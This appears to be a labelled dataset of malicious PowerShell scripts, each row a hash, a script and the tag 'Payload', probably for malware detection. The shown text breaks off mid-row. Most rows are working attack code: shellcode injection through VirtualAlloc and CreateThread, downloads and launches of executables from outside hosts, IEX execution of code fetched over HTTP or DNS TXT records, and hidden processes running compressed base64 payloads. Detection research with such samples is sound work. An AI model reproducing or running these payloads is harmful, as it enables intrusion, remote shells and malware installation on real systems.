$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
30a5d1443d7e3e1e4f15af2900ccf25d5631d5475f52a33c93df91076a0e8264,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vhcwbo.exe',""$env:TEMP\\winrex.exe"");Start-Process (""$env:TEMP\\winrex.exe"")

",Payload
fc04cb621163954fa0f60dfaec9b07b3c9c6a20600609940d59c8a3ef1684e87,"
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/aba.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
46a454f5dbcdbac5a259b59d9c23aa3726f21be0a803e049ebfaf8f950f31ad4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x8e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b7c31b2b0c90d6ff905c0187262ef34db9a745db4a5417d7e421ce58b14354f4,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGImx1cCA7VWbW/aSBD+nEr9D1aFZFt1MBDSNJEq3RpwILwEcDABik4be20WFi+x1+Gl7X+/MdgpUdNe705ngby787KzzzyzYy8OHEF5IG0cMmwy6cvbNyddHOKlpOScxmI8mBVLmpR79NYb9eQEhDlWOj9n9bOHLTNm0idJmaDVqsqXmAbTq6tKHIYkEId5/poIFEVk+cAoiRRV+ioNZyQkp7cPc+II6YuU+zN/zfgDZqnatoKdGZFOUeAmshZ3cBJc3loxKhT582dZnZwWp/naY4xZpMjWNhJkmXcZk1Xpm5pseLddEUVuUyfkEfdEfkiDs1J+EETYIx3w9kTaRMy4G8kqnAZ+IRFxGEgvzpU4OqgpMgy7IXeQ64YkAqt8I3jiC6LkgpgxTfpDmaRR9ONA0CUBuSAhX1kkfKIOifJ1HLiM9Ik3VTpknR3+d42UYyPQ6opQ1SA5vwi3zd2YkYMHWf0x4OfEqvBkyQU0vr198/aNlxEibBaP2QCjk8l+TCBSpcsjulf7JBU0qQ17YcHDLUxzd2FM1Kk0STIxmU7Bv4Pa0WU4D7SfOylmFqAf9YsXDukO+pYLkonNqTsFyzRfOWFvzM4c+wucSH/OvirxaECq2wAvqZMRTHktB8RjZH/ofKbWgQgVORUQt0oY8bFI0NSkyY9mtSUVz7ZGTJlLQuRAHiOIClKsvgzmkCBFbgRtsgTUDnMZUuEBrUmmnVJ5m+2ezEFJrjAcRZrUjaGuHE2yCGbE1SQURDQVoVjw/VD+Hm47ZoI6OBKZu6n6Es101woPIhHGDqQTELizVsShmCWAaFKdusTYWtTPdpdfhaOCGaOBD56eIB2wksBgiYQkoasdEULNW0Q0litGlqC4r3WTYR8qO62LPbWwT1z59WAz1h8onoCToXIUKmTcYlxokk1DARdHAvQRx/5DQEfXx1FolZCk2VKyqpoYW5EUQ050UX/XKY8T6qbA7WEKBUBkhnxp4Ih8KFsiBACVd/otrSB4Ro2AtR1jQYtoTYuNNvwH9KzBqxdu82Ze18PqZuahRtRo17vVXr1efrqx7LKwag3R7DZEu3Y/n1uo3h+MxLiB6ne0sBiVd6sburNayB1t9A87Y7cuGJvd3He9UdXz/AvP6hfPTdoaVnpGoYRb1VrcGhpro1COanRd79FBb3FjioeRzfDA0/374iWmm1Y4t4u8vWsgdD07c3Y3nn09a7vbUV2/HJYXqIZQJajZpsGbIyNEXd3Gvs3XTd+oDP0KMkyHknFvYBq9nmmgwfX8sXqp+2B7j2fG0C7R8eq+P4O5CSE09UK54ZIdH/UApGuOsN8HHb9ScmYe6FTfI+N9h0clvDA4MkDHHD9CXKOV2WUgvxuUOLJZ5x6j1nhr6npx1C2jeoEOr32UuMS+0cMoeqruqnrRdrk7PO+MPN2+Zxd6tXK3cjxd19f1atMZFzcfby8+tobUXnI00HX7XcIQoEhuXbxdHeX7Z1d+G4fRDDPgAdzhWZGaPDTTG7nLaWKhKGmrXpAwIAyaG7S/jNqIMe4k/SG5vaE1HRrGFKp0AMOz0qsjVXpWVL+3i2zp6moMYUKRZNTNt0jgi5lW2JwVCnD5FzblAhz1949X4aut8uxOSxrIHqPjPdh+DzWpnRwTj0Oza/n/N4Zp3c7g5f4Nht/XfiH9LVwL2uHsPyy/XPhHAP+Lsw8xFaBrwa3DyKE9vgpBypijr4osO8AHL32SL73bWJx24IPjL80j3eZhCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
090e0f85d1ed5f677f5be0c2ef2aa359586ec65ef9dbd9def88c7c10b92367ed,"
$giSg = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $giSg -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x93,0x9a,0x11,0xd2,0xd9,0xea,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xeb,0x6f,0x78,0xe4,0x2e,0x67,0xff,0x07,0xcf,0x77,0x60,0x81,0x2a,0x46,0xa0,0xf5,0x3f,0xf8,0x10,0x7d,0x6d,0xf4,0xdb,0xd3,0x86,0x8f,0xae,0xfb,0xa9,0x38,0x04,0xda,0x84,0xb9,0x35,0x1e,0x86,0x39,0x44,0x73,0x68,0x00,0x87,0x86,0x69,0x45,0xfa,0x6b,0x3b,0x1e,0x70,0xd9,0xac,0x2b,0xcc,0xe2,0x47,0x67,0xc0,0x62,0xbb,0x3f,0xe3,0x43,0x6a,0x34,0xba,0x43,0x8c,0x99,0xb6,0xcd,0x96,0xfe,0xf3,0x84,0x2d,0x34,0x8f,0x16,0xe4,0x05,0x70,0xb4,0xc9,0xaa,0x83,0xc4,0x0e,0x0c,0x7c,0xb3,0x66,0x6f,0x01,0xc4,0xbc,0x12,0xdd,0x41,0x27,0xb4,0x96,0xf2,0x83,0x45,0x7a,0x64,0x47,0x49,0x37,0xe2,0x0f,0x4d,0xc6,0x27,0x24,0x69,0x43,0xc6,0xeb,0xf8,0x17,0xed,0x2f,0xa1,0xcc,0x8c,0x76,0x0f,0xa2,0xb1,0x69,0xf0,0x1b,0x14,0xe1,0x1c,0x4f,0x25,0xa8,0x48,0xbc,0x04,0x53,0x88,0xaa,0x1f,0x20,0xba,0x75,0xb4,0xae,0xf6,0xfe,0x12,0x28,0xf9,0xd4,0xe3,0xa6,0x04,0xd7,0x13,0xee,0xc2,0x83,0x43,0x98,0xe3,0xab,0x0f,0x58,0x0c,0x7e,0xa5,0x5d,0x9a,0x41,0x92,0x5f,0x5d,0x2a,0xe1,0x5f,0x70,0xf6,0x6c,0xb9,0x22,0x56,0x3f,0x16,0x82,0x06,0xff,0xc6,0x6a,0x4d,0xf0,0x39,0x8a,0x6e,0xda,0x51,0x20,0x81,0xb3,0x0a,0xdc,0x38,0x9e,0xc1,0x7d,0xc4,0x34,0xac,0xbd,0x4e,0xbb,0x50,0x73,0xa7,0xb6,0x42,0xe3,0x47,0x8d,0x39,0xa5,0x58,0x3b,0x57,0x49,0xcd,0xc0,0xfe,0x1e,0x79,0xcb,0x27,0x68,0x26,0x34,0x02,0xe3,0xef,0xa0,0xed,0x9b,0x0f,0x25,0xee,0x5b,0x46,0x2f,0xee,0x33,0x3e,0x0b,0xbd,0x26,0x41,0x86,0xd1,0xfb,0xd4,0x29,0x80,0xa8,0x7f,0x42,0x2e,0x97,0x48,0xcd,0xd1,0xf2,0x48,0x31,0x04,0x3a,0x3f,0x5b,0x94;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lcRX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lcRX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lcRX,0,0,0);for (;;){Start-sleep 60};

",Payload
73c3c03fe6bbceaa61262b3ff851f6f0be18f1b4fabd05213cac1c3347a9e230,"
$Wc=NEw-OBJeCt SysteM.NEt.WEBCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadErS.ADD('User-Agent',$u);$Wc.ProxY = [SYSTEM.NET.WebREQUEsT]::DEfAULTWeBPROXy;$WC.ProXy.CredenTiaLs = [SystEm.NET.CRedEntIALCAChe]::DEfAUltNETWORkCREdenTialS;$K='c51ce410c124a10e0db5e4b97fc2af39';$I=0;[CHaR[]]$b=([cHaR[]]($Wc.DoWnLOADStriNG(""http://192.168.8.60:4444/index.asp"")))|%{$_-bXOr$k[$I++%$k.LEnGTh]};IEX ($B-joIN'')

",Payload
96d6a9c601102cb92802dfc3f8774cdc26fd778e1968de2eca6d0a4d2a873b4e,"
if(''+(nslookup -q=txt p.s.os.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]}

",Payload
15ff746194c5f03b5e26a9abbe6bbe942b046a61cae75534967b10592a87fe59,"
$NlG = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $NlG -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xbb,0x81,0x80,0xda,0x2b,0xb1,0x47,0x31,0x5e,0x18,0x83,0xee,0xfc,0x03,0x5e,0x95,0x62,0x2f,0xd7,0x7d,0xe0,0xd0,0x28,0x7d,0x85,0x59,0xcd,0x4c,0x85,0x3e,0x85,0xfe,0x35,0x34,0xcb,0xf2,0xbe,0x18,0xf8,0x81,0xb3,0xb4,0x0f,0x22,0x79,0xe3,0x3e,0xb3,0xd2,0xd7,0x21,0x37,0x29,0x04,0x82,0x06,0xe2,0x59,0xc3,0x4f,0x1f,0x93,0x91,0x18,0x6b,0x06,0x06,0x2d,0x21,0x9b,0xad,0x7d,0xa7,0x9b,0x52,0x35,0xc6,0x8a,0xc4,0x4e,0x91,0x0c,0xe6,0x83,0xa9,0x04,0xf0,0xc0,0x94,0xdf,0x8b,0x32,0x62,0xde,0x5d,0x0b,0x8b,0x4d,0xa0,0xa4,0x7e,0x8f,0xe4,0x02,0x61,0xfa,0x1c,0x71,0x1c,0xfd,0xda,0x08,0xfa,0x88,0xf8,0xaa,0x89,0x2b,0x25,0x4b,0x5d,0xad,0xae,0x47,0x2a,0xb9,0xe9,0x4b,0xad,0x6e,0x82,0x77,0x26,0x91,0x45,0xfe,0x7c,0xb6,0x41,0x5b,0x26,0xd7,0xd0,0x01,0x89,0xe8,0x03,0xea,0x76,0x4d,0x4f,0x06,0x62,0xfc,0x12,0x4e,0x47,0xcd,0xac,0x8e,0xcf,0x46,0xde,0xbc,0x50,0xfd,0x48,0x8c,0x19,0xdb,0x8f,0xf3,0x33,0x9b,0x00,0x0a,0xbc,0xdc,0x09,0xc8,0xe8,0x8c,0x21,0xf9,0x90,0x46,0xb2,0x06,0x45,0xf2,0xb7,0x90,0xd5,0x07,0xb4,0xef,0x72,0x0a,0xc4,0xed,0xae,0x83,0x22,0xa1,0xfe,0xc3,0xfa,0x01,0xaf,0xa3,0xaa,0xe9,0xa5,0x2b,0x94,0x09,0xc6,0xe1,0xbd,0xa3,0x29,0x5c,0x95,0x5b,0xd3,0xc5,0x6d,0xfa,0x1c,0xd0,0x0b,0x3c,0x96,0xd7,0xec,0xf2,0x5f,0x9d,0xfe,0x62,0x90,0xe8,0x5d,0x24,0xaf,0xc6,0xc8,0xc8,0x25,0xed,0x5a,0x9f,0xd1,0xef,0xbb,0xd7,0x7d,0x0f,0xee,0x6c,0xb7,0x85,0x51,0x1a,0xb8,0x49,0x52,0xda,0xee,0x03,0x52,0xb2,0x56,0x70,0x01,0xa7,0x98,0xad,0x35,0x74,0x0d,0x4e,0x6c,0x29,0x86,0x26,0x92,0x14,0xe0,0xe8,0x6d,0x73,0xf0,0xd5,0xbb,0xbd,0x86,0x37,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$jcEK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($jcEK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$jcEK,0,0,0);for (;;){Start-sleep 60};

",Payload
f857e9c3e88a67ae68600510a3b32bf70c5b2e8d17fd4717d608f177da435cf4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x0c,0x02,0x66,0x5d,0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x51,0x31,0x6a,0x13,0x83,0xea,0xfc,0x03,0x6a,0x03,0xe0,0x93,0xa1,0xf3,0x66,0x5b,0x5a,0x03,0x07,0xd5,0xbf,0x32,0x07,0x81,0xb4,0x64,0xb7,0xc1,0x99,0x88,0x3c,0x87,0x09,0x1b,0x30,0x00,0x3d,0xac,0xff,0x76,0x70,0x2d,0x53,0x4a,0x13,0xad,0xae,0x9f,0xf3,0x8c,0x60,0xd2,0xf2,0xc9,0x9d,0x1f,0xa6,0x82,0xea,0xb2,0x57,0xa7,0xa7,0x0e,0xd3,0xfb,0x26,0x17,0x00,0x4b,0x48,0x36,0x97,0xc0,0x13,0x98,0x19,0x05,0x28,0x91,0x01,0x4a,0x15,0x6b,0xb9,0xb8,0xe1,0x6a,0x6b,0xf1,0x0a,0xc0,0x52,0x3e,0xf9,0x18,0x92,0xf8,0xe2,0x6e,0xea,0xfb,0x9f,0x68,0x29,0x86,0x7b,0xfc,0xaa,0x20,0x0f,0xa6,0x16,0xd1,0xdc,0x31,0xdc,0xdd,0xa9,0x36,0xba,0xc1,0x2c,0x9a,0xb0,0xfd,0xa5,0x1d,0x17,0x74,0xfd,0x39,0xb3,0xdd,0xa5,0x20,0xe2,0xbb,0x08,0x5c,0xf4,0x64,0xf4,0xf8,0x7e,0x88,0xe1,0x70,0xdd,0xc4,0x9b,0xef,0xaa,0x14,0x0c,0x87,0x3b,0x7a,0xa5,0x33,0xd4,0xce,0x42,0x9a,0x23,0x31,0x79,0xd3,0xf0,0x9e,0xd1,0x47,0x54,0x73,0xbe,0x5d,0x0c,0x0a,0x99,0x5d,0x65,0xbf,0xb6,0xcb,0x85,0x6c,0x6a,0x64,0x53,0x96,0x8c,0x74,0x8b,0xee,0x8c,0x74,0x4b,0x21,0xb8,0x41,0x08,0x7e,0xae,0xa9,0xde,0xe8,0x79,0x23,0x41,0x2e,0x7a,0xe6,0xf7,0x68,0xd6,0x61,0x08,0x76,0xb9,0xf5,0x5b,0x25,0x6a,0xa1,0x08,0x9f,0xe4,0xa6,0xfa,0x31,0xce,0xc7,0xd0,0xdb,0x5a,0x32,0x84,0xb0,0xc9,0x11,0x69,0x60,0x86,0xb8,0x8b,0x94,0x2d,0x3c,0x46,0x21,0x11,0xb7,0x63,0x66,0xe7,0xd5,0x1c,0x88,0xb2,0x84,0x8b,0x97,0x68,0xa2,0x73,0x0f,0x93,0x23,0x74,0xcf,0xfb,0x43,0x74,0x8f,0xfb,0x10,0x1c,0x57,0x58,0xc5,0x39,0x98,0x75,0x79,0x92,0x35,0xff,0x99,0x42,0xd1,0xff,0x45,0x6d,0x21,0x53,0xd0,0x05,0x33,0xc5,0x55,0x37,0xcc,0x3c,0xe0,0x78,0x46,0x72,0x60,0x7f,0xa7,0x4f,0xf2,0x40,0xd2,0xaa,0xa5,0x83,0x43,0xdd,0xdf,0xfb,0x84,0xe2,0xd1,0x31,0x4d,0x33,0x22,0x18,0x81,0x65,0x73,0x64;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
a0529038a978b5a05567c64d91ac21d729cc616c23d1ebd68d5892a27a16f58a,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdf,0xbf,0x84,0x9e,0x73,0x0d,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0x90,0x7c,0x86,0xf1,0x70,0x02,0x69,0x0a,0x80,0x63,0xe3,0xef,0xb1,0xa3,0x97,0x64,0xe1,0x13,0xd3,0x29,0x0d,0xdf,0xb1,0xd9,0x86,0xad,0x1d,0xed,0x2f,0x1b,0x78,0xc0,0xb0,0x30,0xb8,0x43,0x32,0x4b,0xed,0xa3,0x0b,0x84,0xe0,0xa2,0x4c,0xf9,0x09,0xf6,0x05,0x75,0xbf,0xe7,0x22,0xc3,0x7c,0x83,0x78,0xc5,0x04,0x70,0xc8,0xe4,0x25,0x27,0x43,0xbf,0xe5,0xc9,0x80,0xcb,0xaf,0xd1,0xc5,0xf6,0x66,0x69,0x3d,0x8c,0x78,0xbb,0x0c,0x6d,0xd6,0x82,0xa1,0x9c,0x26,0xc2,0x05,0x7f,0x5d,0x3a,0x76,0x02,0x66,0xf9,0x05,0xd8,0xe3,0x1a,0xad,0xab,0x54,0xc7,0x4c,0x7f,0x02,0x8c,0x42,0x34,0x40,0xca,0x46,0xcb,0x85,0x60,0x72,0x40,0x28,0xa7,0xf3,0x12,0x0f,0x63,0x58,0xc0,0x2e,0x32,0x04,0xa7,0x4f,0x24,0xe7,0x18,0xea,0x2e,0x05,0x4c,0x87,0x6c,0x41,0xa1,0xaa,0x8e,0x91,0xad,0xbd,0xfd,0xa3,0x72,0x16,0x6a,0x8f,0xfb,0xb0,0x6d,0xf0,0xd1,0x05,0xe1,0x0f,0xda,0x75,0x2b,0xcb,0x8e,0x25,0x43,0xfa,0xae,0xad,0x93,0x03,0x7b,0x5b,0x91,0x93,0x44,0x34,0x99,0x69,0x2d,0x47,0x9a,0x7c,0xf1,0xce,0x7c,0x2e,0x59,0x81,0xd0,0x8e,0x09,0x61,0x81,0x66,0x40,0x6e,0xfe,0x96,0x6b,0xa4,0x97,0x3c,0x84,0x11,0xcf,0xa8,0x3d,0x38,0x9b,0x49,0xc1,0x96,0xe1,0x49,0x49,0x15,0x15,0x07,0xba,0x50,0x05,0xff,0x4a,0x2f,0x77,0xa9,0x55,0x85,0x12,0x55,0xc0,0x22,0xb5,0x02,0x7c,0x29,0xe0,0x64,0x23,0xd2,0xc7,0xff,0xea,0x46,0xa8,0x97,0x12,0x87,0x28,0x67,0x45,0xcd,0x28,0x0f,0x31,0xb5,0x7a,0x2a,0x3e,0x60,0xef,0xe7,0xab,0x8b,0x46,0x54,0x7b,0xe4,0x64,0x83,0x4b,0xab,0x97,0xe6,0x4d,0x97,0x41,0xce,0x3b,0xf9,0x51;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
18667001282efd272a41d445d583ec125635f79d8ee30ffd1806b4c018c12932,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x8